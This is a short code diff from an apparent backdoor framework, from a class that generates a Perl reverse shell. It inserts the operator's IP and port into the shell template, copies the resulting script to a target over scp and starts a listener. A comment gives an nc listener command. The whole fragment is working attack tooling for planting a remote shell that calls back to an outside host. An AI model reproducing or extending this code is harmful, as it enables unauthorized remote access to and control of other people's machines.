@@ -28,13 +28,13 @@ class Perl(Backdoor):
             data=myfile.read()
         data = data[:-1]#remove the last new line character.
         stringToAdd+=data + self.core.localIP
-
+        stringToAdd+="\';\nmy $port = " + str(port) + ";"
         with open ("backdoors/shell/perl/prs2", "r") as myfile:
             data=myfile.read()
         stringToAdd+=data
         fileToWrite.write(stringToAdd)
         fileToWrite.close()
-        self.listen()
+        self.listen("none", "none")
         #input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
         target.scpFiles(self, 'backdoors/shell/perl/prsA.pl', False)
         print("Moving the backdoor script.")
